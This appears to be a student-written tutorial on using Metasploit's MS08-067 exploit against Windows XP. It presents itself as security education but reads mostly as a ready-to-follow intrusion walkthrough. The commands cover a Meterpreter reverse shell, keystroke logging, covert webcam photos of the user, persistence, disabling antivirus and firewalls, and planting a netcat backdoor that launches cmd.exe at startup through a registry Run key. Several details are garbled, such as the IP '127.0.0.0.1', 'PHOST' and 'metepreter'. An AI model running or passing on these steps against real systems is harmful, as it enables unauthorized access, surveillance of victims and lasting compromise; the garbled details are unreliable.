
#Metasploit Instructions
##Introduction
Metasploit is a software tool used for using exploit to test the vulnerability of a computer or server and uses the exploits to gain access to things that had restricted access. This helps computer users understand how defenseless their computer is and important it is that they should fix it. It also allows the users to understand the importance of security. The needed knowledge and skills that come with Metasploit is the ability to use nmap and exploit scanners because the Metasploit doesn’t actually scan for vulnerabilities instead it can only exploit. Without the nmap or exploit scanners you cannot actually use Metasploit because you will not know what exploit to actually use. One should also be able to use and understand some sort of command line in linux or Windows. The necessary tools for Metasploit are a vulnerability scanner of some sort to find out what exploits you need.  Another virtual machine or a computer that belongs to the Metasploit user is also necessary since it is illegal to use Metasploit to exploit and gain access to computers that they are not allowed to access. One must download and install Metasploit.  The steps that I will cover in this are the ability to use the Exploit database and find the exploit that is needed, I will move to how to use the exploit and how to execute said exploit and lastly I will cover how to make use of said exploit by either metepreter or command line.

##Exploiting

	If you were to find your exploit from a using an exploit scanners you can skip this step. Otherwise use nmap to find out what type of OS the system you are trying to exploit uses, and see if it is unpatched version of the OS.  Once you have found out what OS it is you should look up what exploits can be used for this system’s vulnerability. For example say you are using windows XP on your computer and port 445 is open.  You could google different exploits that are used for windows XP service that are available in Metasploit.  We find that there is an exploit called MS08-67 for windows. If you were using an exploit scanner it would tell you vulnerability on that system and you wouldn’t need to google what it is.  Instead one could find out much about the different exploits from info provided by the scanner. Once you find out what the name of the exploit is you now can use Metasploit. Firstly you want to use the Metasploit console and enter the line “use exploit/” and because we are using windows we will use “use exploit/windows/ “ After this we need to know what kind of exploit this is luckily though we already know what kind of exploit this from the google search or the exploit scan. Once we get this down we can now use tab to list the number of exploits that you that windows has. But since we already know which exploit we are going to use we use the command “use exploit/windows/smb/ms08_067_netapi”. 
	After getting to the exploit we need there are multiple things we must set up before we can use the exploit against the vulnerable computer. To do this we use the show options command in Metasploit which will give us three options for the MS08-67 exploit, but we will only be using the first two.  The first option is RHOST which is the address of the host. We use the command “set RHOST 127.0.0.0.1” with the correct IP address of the user you are using. The second option is PHOST with this we must use an open port that the target computer has open. We set this to port 445 because that is the port that is used for this type of exploit. One would have figured this out from previous steps such as the nmapping or exploit scan. 
	The next step in the process is to set the payload. With this we use the show payload command which shows every type of payload we can use for this exploit. For this one we will use the metepreter reverse tcp . This allows us to use the metepreter function of Metasploit which has many different tools and built in scripts. So to do this we the command “set  payload windows/metepreter/reverse-tcp”. This step sets the payload to activate we you use the run command. Before you can run it you must set the properties for the payload. For this we use show payload options and one can see that there is two different options. The first option is LHOST which we want to set to your ip address. To change this we use the “set LHOST 127.0.0.1.”. The second option is the port you want to use to connect to the exploited machine.  To change this we use “set LPORT 6666”. After this is all done and it done correctly we should be able to run the exploit against the vulnerable.
	If everything is working correctly the exploit should work and the payload should drop. We should have access to the metepreter. At this point there a few things we can and should do. First thing we want to do is check the system we are running on. There are multiple things you can do now with this now which I will split into multiple sections.
	The first section will be about getting information about the user from metepreter.  The first thing we can run is the sysinfo command to get the system information of the computer that you are running. This will be extremely helpful if you were unaware of how patched the XP machine is. The next thing we can do is use a keylogger to get passwords or personal information about the user. We do this by using the command “keyscan” into the metepreter. With this it will scan for keystrokes and when we want to see what the user has typed in we use the “key_dump” to see what the user has typed in. Another thing you can do on the machine is see the user screen. This is done through the command “getgui –u username –p password”. This will enable rdp if it has been disabled and will allow you to get access to the screen of the computer. The last thing I will include in getting information about the user is the webcam command. To see if the computer has any webcams we use the command webcam_list and if there is one we can use the command “webcam_snap” which will take a picture of the person using the computer.
	The next section I will talk about is how to maintain access to the computer. The next thing you should do is use the metepreter persistence which will allow you to have access to the system under certain situations.  To do this we use the command “run persistence –X –i  5 –p 6665 –r  127.0.0.1”. The –X will connect you to the computer whenever you have metepreter open and the system is booted up. The –i is the intervals that it will try to connect to the host. The –p is for the port that you will be connecting to and the –r is used for your ip address. This will allow you connect the infected machine even after the user has shut down when the user turns it back on instead of kicking you off for good. Let also say we want to make sure we don’t get kicked off the machine by an antivirus, we could run the command “killav” which can disable many anti viruses. We can also use the command “run getcountermeasures” to see if we can disable firewalls of the infected computer. The last thing you might want to do is install a backdoor to get to the computer if the persistence command fails. This can be done with the by first uploading netcat to the remote system using the command “upload /usr/share/windows-binaries/nc.exe C:\windows\system32” which will put the netcat executable onto the vulnable machine. The next thing we do is to allow it to run at every time the computer starts up so we use the command “reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 455 -e cmd.exe'”. This will make the netcat start everytime with port 455 open.  The last thing we need to is make sure the firewall will enable the netcat connection to go through ( which could be avoided if you disabled the firewall with getcountermeasures). We do this by using the command “netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL” which will open up the port to be accessed through the firewall. With the backdoor installed you no longer need to use metesploit to log into the vulnerable machine. Instead you need only to use “nc -v 127.0.0.01 455” in your commandline to connect to the machine that you have infected. 
	While this is only one of the exploits that you can to gain access to computer the purpose of the exploit is many of things taught in these instructions can be substituted for other exploits or scripts. So even though it doesn’t cover all of the types of instructions many things can be learned from just one example of an exploit. I choose the MS08-67 exploit because it was easy and allows for remote access while some exploits do not. Hopefully these instructions will help you understand Metasploit better and how to be safer and more proficient with computers.
